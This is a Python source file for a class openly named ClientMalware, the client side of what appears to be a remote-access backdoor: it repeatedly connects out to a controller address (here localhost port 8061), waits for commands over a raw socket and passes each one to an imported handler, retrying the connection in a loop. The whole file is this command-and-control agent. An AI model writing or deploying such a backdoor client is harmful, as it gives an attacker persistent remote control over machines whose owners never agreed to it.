import socket
import time
from client.Handler import Handler

class ClientMalware:
    def __init__(self, addr):
        self.handler = Handler().main
        self.addr = addr
        self.run()
    
    def handle(self, s, command_name):
        return self.handler(command_name)(s)

    def create_socket(self):
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def run(self):
        while True:
            try:
                while True:
                    s = self.create_socket()
                    try:
                        s.connect(self.addr)
                    except:
                        print('Erro , tentando novamente em 10 segundos')
                        s = self.create_socket()
                        time.sleep(5)
                    else:
                        break
                while True:
                    command = s.recv(2048).decode()
                    if not command: s.close()
                    print('Command received '+command)
                    self.handle(s, command)
            except Exception as E:
                if E == KeyboardInterrupt:
                    exit()
                pass

ClientMalware(('127.0.0.1', 8061))
